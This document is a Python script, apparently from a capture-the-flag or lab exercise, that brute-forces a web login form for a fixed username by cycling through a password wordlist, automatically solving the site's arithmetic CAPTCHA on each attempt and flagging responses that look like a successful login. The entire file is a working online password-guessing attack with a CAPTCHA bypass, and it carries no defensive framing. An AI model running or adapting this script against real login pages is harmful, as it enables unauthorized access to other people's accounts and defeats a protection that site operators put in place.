import re
import requests

BASE_URL = "url_here"
LOGIN_URL = f"{BASE_URL}/login"

session = requests.Session()

CAPTCHA_RE = re.compile(r'(\d+)\s*([+\-*])\s*(\d+)\s*=\s*\?')

def find_captcha(html):
    """
    Returns (a, op, b) if a captcha question is present in the page,
    or None if the page doesn't currently require one.
    """
    match = CAPTCHA_RE.search(html)
    if not match:
        return None
    return match.groups()

def solve_captcha(a, op, b):
    a, b = int(a), int(b)
    if op == '+':
        return a + b
    elif op == '-':
        return a - b
    elif op == '*':
        return a * b
    raise ValueError(f"Unknown operator: {op}")

def attempt_login(username, password):
    """
    Sends the login POST directly. If the response indicates a captcha
    is required, parses the arithmetic question from that response,
    solves it, and resubmits with the answer included.
    """
    data = {"username": username, "password": password}

    resp = session.post(LOGIN_URL, data=data, allow_redirects=False)

    captcha = find_captcha(resp.text)
    if captcha:
        a, op, b = captcha
        answer = solve_captcha(a, op, b)
        print(f"[+] Captcha required: {a} {op} {b} = {answer}")
        data["captcha"] = answer
        resp = session.post(LOGIN_URL, data=data, allow_redirects=False)

    return resp

def check_password(username, password):
    """
    Sends one login attempt for a KNOWN-VALID username with a given
    password, and classifies the result.
    """
    resp = attempt_login(username, password)
    text = resp.text

    if "does not exist" in text:
        return "unexpected_invalid_user"  # shouldn't happen if username is confirmed valid
    elif "Invalid captcha" in text:
        return "captcha_failed"
    elif "incorrect password" in text.lower() or "wrong password" in text.lower():
        return "wrong_password"
    elif "Log in" not in text or resp.status_code in (301, 302, 303, 307, 308):
        return "possible_success"
    else:
        return "unknown"

def load_wordlist(filepath):
    with open(filepath, "r") as f:
        return [line.strip() for line in f if line.strip()]

def find_password(username, passwords):
    for password in passwords:
        verdict = check_password(username, password)
        print(f"[{verdict:>22}] {username}:{password}")
        if verdict == "possible_success":
            print(f"\n[!!!] Likely valid credentials: {username}:{password}")
            return password
    print("\n[-] No password in the list produced a success signal.")
    return None

if __name__ == "__main__":
    USERNAME = "natalie"
    passwords = load_wordlist("passwords.txt")
    print(f"[+] Loaded {len(passwords)} passwords from passwords.txt")

    find_password(USERNAME, passwords)
